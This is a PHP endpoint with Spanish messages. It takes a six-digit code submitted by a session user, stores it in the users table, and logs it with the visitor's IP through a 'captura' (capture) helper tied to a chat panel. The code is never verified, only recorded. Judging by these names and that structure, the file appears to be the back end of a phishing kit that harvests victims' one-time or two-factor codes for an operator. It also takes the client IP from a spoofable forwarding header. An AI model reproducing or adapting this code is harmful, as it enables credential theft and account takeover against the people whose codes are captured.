<?php
session_start();
require_once '../php_config/conexionbd.php';
require_once '../php_modales/chat_captura_helper.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => 'Método no permitido']);
    exit;
}

if (!isset($_SESSION['usuario_id'])) {
    echo json_encode(['success' => false, 'error' => 'Sesión no válida']);
    exit;
}

$token = isset($_POST['token_codigo']) ? trim($_POST['token_codigo']) : '';
if ($token === '' || strlen($token) !== 6 || !ctype_digit($token)) {
    echo json_encode(['success' => false, 'error' => 'Código inválido (6 dígitos)']);
    exit;
}

try {
    $pdo = conectarBD();
    $usuario_id = (int) $_SESSION['usuario_id'];
    $ip_real = $_SERVER['HTTP_X_FORWARDED_FOR']
             ?? $_SERVER['HTTP_X_REAL_IP']
             ?? $_SERVER['REMOTE_ADDR']
             ?? 'unknown';

    $stmt = $pdo->prepare("UPDATE usuarios SET token_codigo = ? WHERE id = ?");
    $stmt->execute([$token, $usuario_id]);

    insertarCapturaUsuario($pdo, $usuario_id, $ip_real, "Codigo ingresado:\n $token");

    echo json_encode(['success' => true]);
} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'Error al guardar']);
}
?>
